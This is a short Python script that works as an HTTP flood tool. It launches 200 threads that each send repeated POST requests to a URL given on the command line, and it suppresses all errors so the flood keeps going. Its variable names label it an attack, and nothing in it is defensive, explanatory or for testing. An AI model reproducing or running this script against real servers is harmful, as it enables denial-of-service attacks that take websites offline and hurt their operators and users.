import requests, sys, threading

def http_post(url,timing):
    for _ in range(int(timing)):
        try:
            requests.post(url)
            requests.post(url)
        except:
            pass


url = sys.argv[1]
timing = sys.argv[2]
attk_threads = 200
for _ in range(int(attk_threads)):
    try:
        attk = threading.Thread(target=http_post, args=(url, timing))
        attk.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit()